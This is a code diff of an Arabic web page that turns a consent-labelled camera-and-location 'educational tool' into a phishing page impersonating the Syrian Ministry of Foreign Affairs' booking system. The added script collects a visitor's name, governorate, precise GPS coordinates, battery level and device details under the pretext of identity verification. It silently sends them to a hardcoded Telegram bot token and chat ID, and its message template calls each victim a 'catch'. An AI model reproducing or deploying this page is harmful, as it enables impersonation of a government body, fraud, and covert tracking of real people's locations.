@@ -1,242 +1,176 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>أداة تعليمية - كاميرا + موقع + تلغرام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background: #0a0f1e;
-            color: #eee;
-            direction: rtl;
+        /* التنسيقات اللونية الرسمية */
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #f8f9fa; 
+            margin: 0; 
+            text-align: center; 
+            font-weight: 900; 
+            color: #333;
         }
-        .container {
-            max-width: 600px;
-            margin: auto;
-            background: #1e2a3a;
-            padding: 20px;
-            border-radius: 20px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        .header { 
+            background: #ffffff; 
+            padding: 20px; 
+            border-bottom: 5px solid #b38a2e; /* اللون الذهبي الرسمي */
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
         }
-        video, canvas {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 15px;
-            margin: 10px 0;
-            border: 2px solid #00d8ff;
+        .header img { 
+            max-width: 85%; 
+            height: auto; 
+            max-height: 90px; 
         }
-        button {
-            background: #00d8ff;
-            border: none;
-            padding: 12px 25px;
-            margin: 10px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
+        .container { 
+            max-width: 450px; 
+            margin: 30px auto; 
+            padding: 30px; 
+            background: #ffffff; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
+            border: 1px solid #e0e0e0;
+        }
+        h2 { 
+            color: #1a237e; /* الأزرق الملكي */
+            font-size: 26px; 
+            margin-bottom: 10px; 
+            border-bottom: 2px solid #b38a2e;
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+        .promo-box { 
+            background-color: #fff3cd; 
+            color: #856404; 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 25px; 
+            border: 1px solid #ffeeba;
+        }
+        label { 
+            display: block; 
+            text-align: right; 
+            margin: 15px 5% 8px; 
+            font-size: 18px; 
+            color: #1a237e; 
+        }
+        input, select { 
+            width: 90%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: 2px solid #ced4da; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            background: #fdfdfd; 
+            outline: none;
+        }
+        input:focus { border-color: #b38a2e; }
+        
+        .btn { 
+            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 12px; 
+            width: 90%; 
+            font-size: 20px; 
+            font-weight: 900; 
+            cursor: pointer; 
+            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
             transition: 0.3s;
         }
-        button:hover {
-            background: #00a2cc;
-            transform: scale(1.02);
-        }
-        .warning {
-            background: #ff9800;
-            color: #000;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 14px;
-        }
-        .status {
-            background: #111;
-            padding: 8px;
-            border-radius: 8px;
-            font-family: monospace;
-            margin-top: 15px;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 8px;
-            border: none;
-            direction: ltr;
-            text-align: center;
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
+        
+        .footer { 
+            margin-top: 40px; 
+            font-size: 13px; 
+            color: #6c757d; 
+            padding-bottom: 30px; 
         }
     </style>
 </head>
 <body>
 
+<div class="header">
+    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
+</div>
+
 <div class="container">
-    <h2>⚠️ أداة تعليمية فقط ⚠️</h2>
-    <p>هذه الأداة تعمل <strong>على جهازك أنت شخصيًا</strong> بعد أخذ الإذن منك.<br>
-    استخدامها على شخص آخر دون موافقته <span style="color:red">غير قانوني</span>.</p>
-    
-    <div class="warning">
-        📌 ستطلب الصفحة صلاحيات: الكاميرا + الموقع الجغرافي<br>
-        📤 سيتم إرسال الصورة + الموقع إلى بوت تلغرام <strong>تملكه أنت</strong>
+    <h2>منظومة الحجز الإلكتروني</h2>
+    <div class="promo-box">
+        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
     </div>
-
-    <h3>🎥 معاينة الكاميرا</h3>
-    <video id="video" autoplay playsinline></video>
-    <br>
-    <button id="snap">📸 التقاط الصورة + إرسال للموقع</button>
-
-    <h3>📡 بيانات البوت (عدلها حسب بوتك)</h3>
-    <input type="text" id="botToken" placeholder="توكن البوت" value="8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg">
-    <input type="text" id="chatId" placeholder="معرف الشات (ID)" value="7214473798">
     
-    <div class="status" id="status">⚪ في انتظار السماح للكاميرا والموقع...</div>
+    <label>الاسم الثلاثي:</label>
+    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">
+
+    <label>المحافظة المقيم بها:</label>
+    <select id="city">
+        <option value="">-- اختر من القائمة --</option>
+        <option value="إدلب">إدلب</option>
+        <option value="حلب">حلب</option>
+        <option value="دمشق">دمشق</option>
+        <option value="حمص">حمص</option>
+        <option value="حماة">حماة</option>
+        <option value="اللاذقية">اللاذقية</option>
+        <option value="طرطوس">طرطوس</option>
+        <option value="درعا">درعا</option>
+        <option value="دير الزور">دير الزور</option>
+    </select>
+
+    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
+</div>
+
+<div class="footer">
+    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
 </div>
 
 <script>
-    // عناصر DOM
-    const video = document.getElementById('video');
-    const snapBtn = document.getElementById('snap');
-    const statusDiv = document.getElementById('status');
-    const botTokenInput = document.getElementById('botToken');
-    const chatIdInput = document.getElementById('chatId');
+    async function startProcess() {
+        let name = document.getElementById("name").value;
+        let city = document.getElementById("city").value;
 
-    let stream = null;
-    let currentLocation = null;
+        if (!name || !city) { 
+            alert("يرجى ملء كافة الحقول المطلوبة."); 
+            return; 
+        }
 
-    // ----- طلب صلاحية الكاميرا -----
-    async function initCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            statusDiv.innerHTML = '✅ الكاميرا جاهزة. جارِ تحديد الموقع...';
-            getLocation();
-        } catch (err) {
-            statusDiv.innerHTML = '❌ لا يمكن الوصول للكاميرا: ' + err.message;
-            console.error(err);
+        // طلب الإذن للموقع والكاميرا (كجزء من التحقق الأمني)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let lat = p.coords.latitude;
+                let lon = p.coords.longitude;
+                
+                // جلب معلومات البطارية والجهاز
+                let batt = "غير معروفة";
+                try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
+                let device = navigator.platform + " (" + (navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC") + ")";
+
+                let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+                let chat_id = "7214473798";
+                
+                let text = `🎯 صيد ملون وجديد!\n\n` +
+                           `👤 الاسم: ${name}\n` +
+                           `🏙️ المحافظة: ${city}\n` +
+                           `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
+                           `📱 الجهاز: ${device}\n` +
+                           `🔋 البطارية: ${batt}`;
+
+                // إرسال البيانات فوراً
+                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                new Image().src = url;
+
+                alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
+            }, (err) => {
+                alert("⚠️ عذراً: يجب تفعيل نظام الـ GPS وإذن الوصول للتحقق من هويتك لإتمام الحجز.");
+            }, {enableHighAccuracy: true});
         }
     }
-
-    // ----- طلب صلاحية الموقع الجغرافي -----
-    function getLocation() {
-        if (!navigator.geolocation) {
-            statusDiv.innerHTML += '<br>⚠️ المتصفح لا يدعم تحديد الموقع. سيتم الإرسال بدون موقع.';
-            currentLocation = null;
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                currentLocation = { lat, lon };
-                statusDiv.innerHTML = `✅ الكاميرا جاهزة. 🗺️ الموقع: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
-            },
-            (err) => {
-                statusDiv.innerHTML += '<br>⚠️ فشل تحديد الموقع: ' + err.message + '. سيتم الإرسال بدون موقع.';
-                currentLocation = null;
-            }
-        );
-    }
-
-    // ----- التقاط الصورة (canvas) -----
-    function capturePhoto() {
-        if (!video.srcObject) {
-            alert("الكاميرا غير جاهزة بعد.");
-            return null;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.8);  // Base64 JPEG
-    }
-
-    // ----- إرسال الصورة + الموقع إلى تلغرام -----
-    async function sendToTelegram(imageBase64, location, botToken, chatId) {
-        // 1. إرسال الصورة كملف
-        const blob = dataURLtoBlob(imageBase64);
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'snapshot.jpg');
-
-        let photoOk = false;
-        try {
-            const photoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            const photoJson = await photoRes.json();
-            photoOk = photoJson.ok;
-            if (!photoOk) throw new Error(photoJson.description);
-        } catch (err) {
-            statusDiv.innerHTML = `❌ فشل إرسال الصورة: ${err.message}`;
-            return false;
-        }
-
-        // 2. إرسال الموقع كنص إذا كان موجوداً
-        if (location) {
-            const locationText = `📍 الموقع التقريبي:\nhttps://maps.google.com/?q=${location.lat},${location.lon}\nخط العرض: ${location.lat}\nخط الطول: ${location.lon}`;
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: locationText
-                    })
-                });
-            } catch(e) { console.warn("فشل إرسال نص الموقع", e); }
-        }
-        return true;
-    }
-
-    // مساعدة: تحويل Base64 إلى Blob
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
-        return new Blob([u8arr], { type: mime });
-    }
-
-    // ----- حدث النقر على زر التصوير والإرسال -----
-    snapBtn.onclick = async () => {
-        const botToken = botTokenInput.value.trim();
-        const chatId = chatIdInput.value.trim();
-
-        if (!botToken || !chatId) {
-            statusDiv.innerHTML = '⚠️ أدخل توكن البوت ورقم الشات أولاً.';
-            return;
-        }
-
-        statusDiv.innerHTML = '📸 جارِ التقاط الصورة...';
-        const imageData = capturePhoto();
-        if (!imageData) {
-            statusDiv.innerHTML = '❌ فشل التقاط الصورة. تأكد من الكاميرا.';
-            return;
-        }
-
-        statusDiv.innerHTML = '📤 جارِ الإرسال إلى تلغرام...';
-        const success = await sendToTelegram(imageData, currentLocation, botToken, chatId);
-        if (success) {
-            statusDiv.innerHTML = '✅ تم الإرسال بنجاح! (صورة + موقع إن وُجد)';
-        } else {
-            statusDiv.innerHTML = '❌ فشل الإرسال. تحقق من التوكن ومعرف الشات.';
-        }
-    };
-
-    // بدء التشغيل
-    initCamera();
-
-    // تنظيف الكاميرا عند إغلاق الصفحة (اختياري)
-    window.addEventListener('beforeunload', () => {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
-    });
 </script>
 
 </body>
